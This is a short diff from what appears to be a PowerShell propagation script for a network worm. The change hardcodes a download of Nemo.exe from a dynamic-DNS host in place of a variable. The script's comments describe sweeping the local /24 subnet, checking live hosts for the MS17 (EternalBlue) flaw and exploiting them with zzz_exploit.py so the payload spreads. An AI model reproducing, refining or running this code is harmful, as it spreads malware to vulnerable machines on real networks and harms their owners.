@@ -56,13 +56,13 @@ c:\python27\python -m pip  install impacket
 
 # Download Nemo.exe/WinDef.exe to send to the other vuln devices.
 $Location = '' + $save_dir + '\' + 'Nemo.exe';
-Start-Process -FilePath $wgetBinLocation -Args " http://$father/Nemo.exe -O $Location" -passthru -NoNewWindow -Wait
+Start-Process -FilePath $wgetBinLocation -Args "http://ritrit.ddns.net/Nemo.exe -O $Location" -passthru -NoNewWindow -Wait
 
 
 # Get all valid IPs (The IPs in /24)
 # For example: If the target has 192.168.1.1 it will get all 192.168.1.0/24 IPs
 # Then ping them if an IP is alive, it will be checked for MS17 then Exploit
-c:\python27\python scan.py
+c:\python27\python $save_dir\scan.py
 # NOTE: ^WinDef.exe <- Nemo.exe should be in the same dir as scan.py and zzz_exploit.py
 
 
